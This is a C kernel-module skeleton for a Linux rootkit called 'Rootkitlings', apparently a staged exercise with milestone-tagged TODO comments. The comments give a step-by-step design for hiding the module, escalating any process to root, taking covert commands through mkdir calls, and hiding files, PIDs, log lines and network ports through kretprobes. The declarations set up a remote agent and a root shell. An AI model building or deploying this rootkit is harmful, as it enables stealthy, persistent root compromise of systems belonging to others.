// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/hex.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "agent.h"
#include "ipv4.h"
#include "root_shell.h"
#include "target_list.h"

#define RK_BUF_MAX 2048
#define RK_CMD_MAX 128
#define RK_PREFIX "rkling."
#define RK_PREFIX_LEN 7
#define RK_PATH_MAX 128

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);

static char control_key[65];
module_param_string(control_key, control_key, sizeof(control_key), 0400);

static struct rk_agent agent;
static struct rk_root_shell shell;
struct rk_target_list file_targets;
struct rk_target_list pid_targets;
struct rk_target_list content_targets;
struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;
static struct list_head *saved_prev;
static bool cloaked;
static bool persist_requested;

// TODO: Implement module cloaking (M01)
// rk_module_cloak(): list_del(&THIS_MODULE->list), save prev
// rk_module_uncloak(): list_add(&THIS_MODULE->list, saved_prev)

// TODO: Implement rk_escalate_self()
// prepare_kernel_cred(&init_task) + commit_creds for calling task

// TODO: Implement rk_escalate_pid(unsigned int pid)
// find_task_by_vpid under rcu_read_lock, get_task_struct,
// prepare_kernel_cred(&init_task), replace task->real_cred and task->cred
// Note: find_task_by_vpid is not exported; resolve it at init via kprobe

// TODO: Implement rk_parse_local_command(path)
// Dispatch on command after "rkling." prefix:
//   "e"           -> rk_escalate_self()
//   "h.m"         -> rk_module_cloak()
//   "u.m"         -> rk_module_uncloak()
//   "persist"     -> set persist_requested
//   "h.f.VALUE"   -> rk_target_add(&file_targets, VALUE)
//   "h.i.VALUE"   -> rk_target_add(&pid_targets, VALUE)
//   "h.c.VALUE"   -> rk_target_add(&content_targets, VALUE)
//   "h.p.VALUE"   -> rk_target_add(&port_targets, VALUE)
//   "u.f.N"       -> rk_target_remove(&file_targets, N, ...)
//   "u.i.N"       -> rk_target_remove(&pid_targets, N, ...)
//   "u.c.N"       -> rk_target_remove(&content_targets, N, ...)
//   "u.p.N"       -> rk_target_remove(&port_targets, N, ...)
//   else          -> return -ENOENT

// TODO: Implement mkdir interception (M02)
// kretprobe on __x64_sys_mkdir
// Entry: get inner pt_regs from arg 0, read user pathname from uregs->di,
//   strncpy_from_user, check "rkling." prefix, dispatch to rk_parse_local_command,
//   null out pathname to suppress real mkdir
// Return: if intercepted, override return value with command result

// TODO: Implement directory/PID hiding (M03)
// kretprobe on __x64_sys_getdents64
// Entry: capture dirp from args
// Return: copy buffer, filter dirents using rk_target_prefix_match
//   and rk_target_number_match, copy back, adjust return value

// TODO: Implement content hiding (M06)
// kretprobe on vfs_read
// Return: scan buffer line by line, remove lines matching
//   rk_target_substring_match(&content_targets, ...)

// TODO: Implement port hiding (M06)
// kretprobe on tcp4_seq_show
// Entry: check inet_sport against port_targets, save seq and seq->count
// Return: rewind seq->count to hide matching entries

// TODO: Implement proc interface at /proc/rkling_status
// Read: show cloaked state and all four target lists
// (The proc interface is read-only; commands come via agent or mkdir)

// TODO: Implement hex key parser

// TODO: Implement rk_init()
// 1. Parse key, peer address, validate params
// 2. Init all four target lists
// 3. Init root shell, start agent
// 4. Register getdents64 kretprobe
// 5. Register vfs_read kretprobe
// 6. Register tcp4_seq_show kretprobe
// 7. Register mkdir kprobe
// 8. Create /proc/rkling_status (0400, read-only)
// 9. Auto-stealth: rk_target_add(&file_targets, "rkling")
// Clean up in reverse order on failure

// TODO: Implement rk_exit()
// Uncloak module, remove proc, unregister all probes (incl mkdir),
// stop agent, stop shell, zeroize key

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings complete rootkit");
